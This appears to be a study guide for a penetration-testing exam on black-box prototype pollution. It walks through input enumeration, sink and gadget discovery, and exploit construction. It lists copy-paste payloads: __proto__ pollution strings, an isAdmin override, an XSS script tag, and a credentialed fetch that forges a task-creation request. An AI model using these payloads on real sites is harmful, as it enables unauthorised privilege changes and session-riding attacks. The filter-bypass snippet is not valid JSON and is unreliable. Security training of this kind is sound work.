# Prototype Pollution Attack Strategy Guide

> [!info]  
> **Purpose**: A black‑box attack guide to identify and exploit prototype pollution in a live web application during an open‑book pen‑test exam.

---

## Quick Concept Summaries

> [!info]  
> **Prototype Pollution**: Attackers inject or override properties on JavaScript object prototypes (e.g., `Object.prototype`) via user‑controlled input, influencing application behavior globally when merged into objects.

---

## Step‑By‑Step Test Strategies

> [!tip]  
> Use this checklist sequentially to discover, confirm, and exploit prototype pollution without source code access.

1. **Input Enumeration**
    
    - Inspect all GET and POST parameters in Burp Proxy or browser network tab.
        
    - Identify endpoints accepting arbitrary JSON or query strings.
        
    - Note use of structured parameters (`settings=…`) or deep objects.
        
2. **Smoke‑Test Pollution Payloads**
    
    - Append to any URL or JSON body:
        
        ```plaintext
        ?__proto__.polluted=true
        ```
        
        or in JSON:
        
        ```json
        {"__proto__":{"polluted":true}}
        ```
        
    - Check in browser console or intercept response for side effects (e.g., new global keys).
        
3. **Sink Discovery**
    
    - Reload page with pollution payload and monitor:
        
        - DOM changes (e.g., `innerHTML` updates) via inspector.
            
        - Authorization controls (e.g., access to admin panels).
            
    - In Burp, use DOM Invader or search for keywords in responses: `innerHTML`, `eval(`, `Function(`.
        
4. **Gadget Identification**
    
    - Test common prototype‑derived flags:
        
        - `isAdmin`, `role`, `debug`, `featureEnabled`, `message`.
            
    - Append payloads targeting these fields and observe behavioral changes.
        
5. **Exploit Construction**
    
    - Combine source + gadget + sink:
        
        ```plaintext
        /dashboard?__proto__.message=<script>alert(1)</script>
        ```
        
    - For action forgery:
        
        ```html
        <script>fetch('/tasks/create',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=hacked',credentials:'include'});</script>
        ```
        

---

## Copy‑Paste Commands & Payloads

> [!info]  
> Standard payloads for rapid execution.

```plaintext
?__proto__.polluted=true
?constructor.prototype.polluted=true
```

```plaintext
// DOM XSS trigger
?__proto__.message=<script>alert(1)</script>
```

```json
// JSON endpoint test
{"__proto__":{"isAdmin":true}}
```

```html
<!-- Auth‑action exploit -->
<script>fetch('/tasks/create',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=x',credentials:'include'});</script>
```

---

## Recommended Tools & Flags

> [!tip]  
> Equip these tools and configurations for effective black‑box testing.

- **Burp Suite** (Community or Pro)
    
    - Proxy to capture parameters and JSON bodies.
        
    - Repeater for iterative payload injection.
        
- **DOM Invader** (Pro)
    
    - Enable **Prototype Pollution** in **Attack Types**.
        
    - Scan for gadgets and sinks automatically.
        
- **Browser DevTools**
    
    - Console for polling `{}.polluted` or other flags.
        
    - Inspector to trace DOM assignments (`innerHTML`).
        
- **HTTP Clients** (curl, httpie)
    
    - Batch JSON payload tests against endpoints.
        

---

## Pitfalls & Exam Hints

> [!warning]  
> Avoid these common mistakes and leverage exam‑specific shortcuts.

- **Naive Filters**: If `__proto__` is blocked, try string concatenation or nested injection:
    
    ```json
    {"pro"+"to"+"type":{"polluted":true}}
    ```
    
- **State Caching**: Clear cookies and localStorage between tests to prevent false negatives.
    
- **Content‑Type Variations**: Test both `application/json` and form‑encoded bodies for server‑side endpoints.
    
- **Limited Time**: Prioritize endpoints with deep‑merge indicators (e.g., parameter names like `settings`, `config`).
    
- **Confirmation Over Assumption**: Always verify via observable behavior (DOM change, privilege shift) rather than tool output alone.
    

---

_Last updated for black‑box web‑app penetration testing._